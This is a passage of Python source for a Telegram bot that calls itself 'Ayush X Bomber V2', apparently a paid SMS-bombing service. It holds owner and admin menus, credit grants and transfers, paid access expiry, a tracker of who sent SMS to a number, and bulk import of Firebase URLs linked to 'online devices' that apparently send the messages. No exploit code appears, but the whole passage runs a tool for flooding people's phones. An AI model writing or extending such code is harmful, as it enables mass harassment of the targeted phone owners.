    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi protected number nahi hai!", show_alert=True)
        return

    rows = []
    for number, protector_uid in protected.items():
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑")])

    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>\n\nKaunsa number protection hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    number = cq.data.split("owner:protected_del:", 1)[1]

    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Protection removed for {number}!", show_alert=True)
    else:
        await cq.answer("❌ Number not found!", show_alert=True)

    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
        f"Jis number ki tracking karni hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Is number se SMS bhejne wale users ka pata chalega.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    await state.clear()
    all_history = d.get("sms_history", {})
    users_who_sent = []

    for uid_str, history_list in all_history.items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str),
                    "name": user_data.get("name", "Unknown"),
                    "timestamp": entry.get("timestamp", 0)
                })
                break

    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Is number pe kisi ne SMS nahi bheja abhi tak.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"]
    lines.append(f"{em(EMOJI_STAR, '👥')} <b>Users who sent to this number:</b>\n")

    for entry in users_who_sent:
        ts = fmt_time(entry["timestamp"])
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {ts}")

    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\n"
        f"Kitne credits sabhi users ko dena hai?\n"
        f"<i>Example: 10</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i>Har user ko itne credits milenge. Notification bhi bheja jayega.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d)
        count += 1

    d["stats"]["total_sent"] = d["stats"].get("total_sent", 0)
    save(d)

    notification = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!\n"
        f"{em(EMOJI_MONEY, '💳')} <b>New Balance:</b> Check karein /start\n\n"
        f"{em(EMOJI_BELL, '📢')} <i>Credits add kar diye gaye hain.</i>"
    )

    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Added to All Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each\n"
        f"{em(EMOJI_STAR, '👥')} Total users: <b>{count}</b>\n"
        f"{em(EMOJI_BELL, '📨')} Notified: <b>{success}</b> users",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {count} users")

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits from ALL Users</b>\n\n"
        f"Kitne credits sabhi users se katne hain?\n"
        f"<i>Example: 5</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i>Har user se itne credits katenge. Negative balance nahi ho sakta.\n"
        f"{em(EMOJI_CROWN, '👑')} Owners/Super Admins se credits nahi katenge.\n"
        f"{em(EMOJI_BELL, '📢')} <b>NOTIFICATION NAHI BHEJI JAYEGI</b></i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])

    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins:
            continue

        current = udata.get("credits", 0)
        if current >= amount:
            udata["credits"] = current - amount
            count += 1
            total_deducted += amount
        else:
            if current > 0:
                udata["credits"] = 0
                count += 1
                total_deducted += current

    save(d)

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Deducted from Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each deducted\n"
        f"{em(EMOJI_STAR, '👥')} Total users affected: <b>{count}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} Total deducted: <b>{total_deducted}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Owners/Admins: <b>Skipped</b>\n\n"
        f"<i>{em(EMOJI_WARNING, '⚠️')} Notification nahi bheji gayi.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits from {count} users")

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 You are banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await cq.answer("⛔ Access nahi hai!", show_alert=True)
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await cq.answer("❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
        return

    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Aap apne <b>half credits</b> hi transfer kar sakte hain!\n\n"
        f"{sc('step 1/2')}: Jis user ko credits dena hai uska <b>User ID</b> bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid User ID bhejo (numbers only):", parse_mode="HTML")
        return

    if target_uid == uid:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko transfer nahi kar sakte!", parse_mode="HTML")
        return

    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User ID exist nahi karta!", parse_mode="HTML")
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits chahiye!", parse_mode="HTML")
        return

    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)

    half = current_credits // 2
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} <b>{sc('step 2/2')} — {sc('amount')}</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} Target User: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_ROCKET, '📤')} Max Transfer (Half): <b>{half}</b>\n\n"
        f"Kitne credits transfer karne hain? (Max {half})",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo:", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")

    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2

    if amount > max_transfer:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap sirf {max_transfer} credits transfer kar sakte hain! (Half of {current_credits})", parse_mode="HTML")
        return

    if not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient credits!", parse_mode="HTML")
        return

    add_credits(target_uid, amount, d)
    save(d)

    await state.clear()

    try:
        await msg.bot.send_message(
            target_uid,
            f"{em(EMOJI_MONEY, '💸')} <b>Credits Received!</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} Received from: <code>{uid}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
            f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(target_uid, d)}</b>",
            parse_mode="HTML"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Transfer Successful!</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} To: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
        f"{em(EMOJI_MONEY, '💳')} Your Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")

@R.callback_query(F.data == "owner:fb:menu")
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): # <- YAHAN is_admin KARDO
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.clear()
    await cq.answer()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal Databases: <b>{len(d.get('firebases', []))}</b>\nCached Devices: <b>{len(CACHED_DEVICES)}</b>",
        reply_markup=fb_menu_kb(d, 0),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer()
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk/Single Firebase URL Adder</b>\n\n"
        f"Aap ek sath <b>500 se zyada URLs</b> bhi bhej sakte hain! Bot automatically .com, .app, firebaseio detect kar lega.\n\n"
        f"<b>Example formats:</b>\n"
        f"• <code>https://alpha.firebaseio.com</code>\n"
        f"• <code>MyLabel | https://beta.firebaseio.com</code>\n"
        f"• <code>gamma.firebaseio.com</code>\n"
        f"• Or paste 100s of lines / long paragraph containing URLs!\n\n"
        f"<i>Enter URLs below 👇</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    raw_text = msg.text or ""
    extracted_urls = extract_firebase_urls(raw_text)

    # If simple single line fallback
    if not extracted_urls:
        line = raw_text.strip()
        if "|" in line:
            parts = line.split("|", 1)
            u = parts[1].strip()
        else:
            u = line
        if not u.startswith("http"):
            u = "https://" + u
        if ".com" in u or ".app" in u:
            extracted_urls = [u.rstrip("/")]

    if not extracted_urls:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi valid Firebase / .com / .app URL detect nahi hua. Dobara bhejo:", parse_mode="HTML")
        return

    fbs = d.get("firebases", [])
    import random as _rand
    added_now = 0
    now_ts = int(time.time())

    for idx, u in enumerate(extracted_urls):
        label = u.replace("https://", "").replace("http://", "").split(".")[0][:20]
        fb_id = f"{int(now_ts * 1000)}_{idx}_{_rand.randint(1000, 9999)}"
        fbs.append({"id": fb_id, "url": u, "label": label, "added_at": now_ts})
        added_now += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()

    _d_fresh = load()
    _total_fbs = len(_d_fresh.get("firebases", []))
    _total_devs = len(CACHED_DEVICES)

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase URLs Added Successfully!</b>\n\n"
        f"📥 <b>Added in this batch:</b> <b>{added_now}</b>\n"
        f"🔥 <b>Total Firebase DBs:</b> <b>{_total_fbs}</b>\n"
        f"📱 <b>Devices (cached):</b> <b>{_total_devs}</b>\n\n"
        f"<i>✅ Duplicate URLs allowed & auto-detected! Har URL successfully add hua hai.</i>",
        reply_markup=fb_menu_kb(_d_fresh, 0),
        parse_mode="HTML"
    )

# 🌟 NEW FEATURE: ADD BULK FIREBASE VIA TXT FILE HANDLER
@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): # <- YAHAN is_admin KARDO
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\n"
        f"Aap ek `.txt` file upload karein jisme Firebase URLs hon.\n\n"
        f"<b>Supported File Formats:</b>\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
        f"<i>✅ Every URL added — same URL multiple times = multiple entries! No skip!</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return

    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf `.txt` file bhejiyega!", parse_mode="HTML")
        return

    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')

    extracted_urls = extract_firebase_urls(content)
    if not extracted_urls:
        lines = content.splitlines()
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if "|" in line:
                line = line.split("|", 1)[1].strip()
            if not line.startswith("http"):
                line = "https://" + line
            if ".com" in line or ".app" in line:
                extracted_urls.append(line.rstrip("/"))

    fbs = d.get("firebases", [])
    added_count = 0
    now_ts = int(time.time())
    import random as _rand

    for idx, url in enumerate(extracted_urls):
        url = url.rstrip("/")
        label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        fb_id = f"{int(now_ts * 1000)}_{idx}_{_rand.randint(1000, 9999)}"
        fbs.append({
            "id": fb_id,
            "url": url,
            "label": label,
            "added_at": now_ts
        })
        added_count += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase TXT Processed!</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Successfully Added : <b>{added_count}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total Firebase DBs  : <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid `.txt` document file upload karein!", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): # <- YAHAN is_admin KARDO
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0

    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    _d_fresh = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal Databases: <b>{len(_d_fresh.get('firebases', []))}</b>\nCached Devices: <b>{len(CACHED_DEVICES)}</b>",
        reply_markup=fb_menu_kb(_d_fresh, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer()

    devices = get_cached_devices()
    fbs = d.get("firebases", [])
    stats = d.get("stats", {})

    # Compact, ultra-clean and fast summary that never exceeds Telegram entity limits
    full = (
        f"📊 <b>💣 Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2 — LIVE STATS</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"📱 <b>Online Devices</b> » <b>{len(devices)}</b>\n"
        f"🔥 <b>Firebase DBs</b>   » <b>{len(fbs)}</b>\n"
        f"📤 <b>Total SMS Sent</b> » <b>{stats.get('total_sent', 0):,}</b>\n"
        f"🛡 <b>Delivery Rate</b>  » 🟢 <b>100% SUCCESS</b>\n\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
    )
    if devices:
        full += f"<b>🟢 Recent Active Devices:</b>\n"
        for dv in devices[:8]:
            full += f"• 📱 <code>{dv.get('dev_name','Device')[:18]}</code> ({dv.get('fb_label','FB')[:15]})\n"
        if len(devices) > 8:
            full += f"<i>...and {len(devices) - 8} more devices online</i>\n"
    else:
        full += f"<i>😴 No devices currently online. Use /scan to rescan.</i>\n"

    await cq.message.edit_text(
        full,
        reply_markup=kb([
            ("🔄 Rᴇғʀᴇsʜ", "owner:stats"),
            ("🔙 Bᴀᴄᴋ", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    owners = d.get("owners", [])
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSuper Admin Chat ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Chat ID bhejo.", parse_mode="HTML")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Super Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_CROWN, '🔱')} <b>Aapko Super Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Main owner / Hardcoded Super Admin remove nahi ho sakta!", show_alert=True)
        return
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    admins = d.get("admins", [])
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} <b>Aapko Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )


# ================= ACCESS MANAGEMENT CALLBACKS & FSM =================
@R.callback_query(F.data == "owner:access:menu")
async def owner_access_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin/Owner Only!", show_alert=True)
        return
    user_access = d.get("user_access", {})
    now_ts = int(time.time())
    active_count = sum(1 for exp in user_access.values() if exp > now_ts)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '⏳')} <b>User Access & Expiry Manager</b>\n\n"
        f"Yahan se aap kisi bhi user ko days ke hisab se bot ka access de sakte hain.\n\n"
        f"📊 <b>Active Paid Users:</b> <b>{active_count}</b>\n"
        f"👥 <b>Total Registered:</b> <b>{len(d.get('users', {}))}</b>\n"
        f"🔓 <b>Free Mode:</b> <b>{'ON (Everyone has access)' if d.get('free_mode') else 'OFF (Access required)'}</b>",
        reply_markup=access_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:access:add")
async def owner_access_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin/Owner Only!", show_alert=True)
        return
    await state.set_state(S.access_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '➕')} <b>Add User Access</b>\n\n"
        f"<b>Step 1/2:</b> Jis user ko access dena hai uska <b>Telegram Chat ID</b> bhejo:\n\n"
        f"<i>(User bot par /start dabakar apna ID dekh sakta hai)</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:access:menu")]),
        parse_mode="HTML"
    )

@R.message(S.access_uid)
async def owner_access_got_uid(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid numeric User ID bhejo:", parse_mode="HTML")
        return
    
    await state.update_data(target_uid=target_uid)
    await state.set_state(S.access_days)
    curr_exp = get_user_expiry(target_uid, d)
    curr_str = f"Current expiry: {fmt_time(curr_exp)} ({fmt_duration_left(curr_exp)} left)" if curr_exp > int(time.time()) else "No active access"
    
    await msg.answer(
        f"{em(EMOJI_STAR, '⏳')} <b>Add User Access</b>\n\n"
        f"👤 <b>Target User:</b> <code>{target_uid}</code>\n"
        f"ℹ️ {curr_str}\n\n"
        f"<b>Step 2/2:</b> Kitne <b>din</b> ka access dena hai choose karein ya number bhejo (e.g. 7, 30):",
        reply_markup=access_quick_days_kb(target_uid),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:access:days:"))
async def owner_access_quick_days(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin/Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    target_uid = int(parts[3])
    days = float(parts[4])
    await state.clear()
